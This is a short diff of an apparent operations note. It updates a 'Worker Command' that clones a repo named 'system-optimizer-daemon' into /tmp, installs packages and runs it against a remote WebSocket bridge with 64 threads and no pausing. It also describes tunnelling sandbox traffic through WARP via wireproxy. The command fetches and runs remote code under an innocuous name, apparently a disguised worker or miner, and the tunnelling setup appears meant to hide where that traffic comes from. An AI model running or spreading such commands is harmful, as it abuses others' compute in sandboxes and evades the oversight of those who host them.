@@ -45,7 +45,7 @@
 
 **Worker Command (moly):**
 ```bash
-cd /tmp && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && cd moly && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge wss://chimera-bridge-production-0ef2.up.railway.app --threads 64 --no-schedule  --no-pause > /tmp/m.log 2>&1
+cd /tmp && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && cd moly && pip install websockets psutil --break-system-packages -q && python3 sysoptd.py --bridge wss://chimera-bridge-production-0703.up.railway.app --threads 64 --no-schedule  --no-pause > /tmp/m.log 2>&1
 ```
 
 **Warp Isolated:** `wireproxy` `socks5://127.0.0.1:40000` `warp=on` `104.28.201.80` vs direct `152.55.177.188 warp=off` - only browser tunneled, `rclone` direct. Inside sandbox `wgcf register --accept-tos && wgcf generate` + `wireproxy` config from `wgcf-profile.conf` (`PrivateKey`/`PublicKey` via `awk "{print \$3}"`).
